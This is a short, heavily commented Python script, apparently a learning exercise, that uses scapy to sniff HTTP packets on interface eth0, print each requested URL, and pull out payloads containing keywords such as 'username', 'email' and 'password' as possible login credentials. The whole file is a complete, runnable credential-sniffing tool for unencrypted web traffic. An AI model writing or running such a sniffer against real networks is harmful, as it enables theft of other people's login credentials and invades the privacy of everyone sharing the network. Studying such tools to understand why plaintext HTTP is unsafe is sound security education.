#!/usr/bin/env python  #the shebang defines the absolute path for the code interpreter (python)
import scapy.all as scapy #imports everything in the scapy module as "scapy"
from scapy.layers import http #imports http module from scapy to filter http traffic

#This "sniff" function will take in an interface as a variable and then sniff packets on that interface
def sniff(interface):
    print("Sniffing eth0...")
    scapy.sniff(iface=interface, prn=process_packet, store=False) #uses scapy's sniff function to sniff packets on the defined interface

#This next function captures the full HTTP URL
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path #this will append the host and the path for the full URL

#This function will look for and capture login credentials based on defined key workds
def get_login(packet):
    # print(packet.show()) #used to ascertain the layer that the email/password is on (HTTP POST)
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)  # prints out the field "load" which has the email/password
        keywords = ["username", "user", "login", "email", "password", "pass"] #list of keywords to search for in the packet
        for keyword in keywords: #this defines a loop for each keyword in the keywords list
            if keyword in load: #if a keyword appears ...
                return load #returns the load which includes the email/password

def process_packet(packet):
    # print(packet.show()) #used to ascertain the layer the layer with url
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet) #runs the get_url function and saves it under this variable
        print("[+] HTTP Request >> " + str(url)) #this will printout the URL by converting it to a string
        login_info = get_login(packet) #runs the get_login function
        if login_info:
            print("[+] Possible username/password > " + login_info + "\n\n") #this prints out the login credentials that were sniffed

sniff("eth0") #run the sniff function on the interface eth0
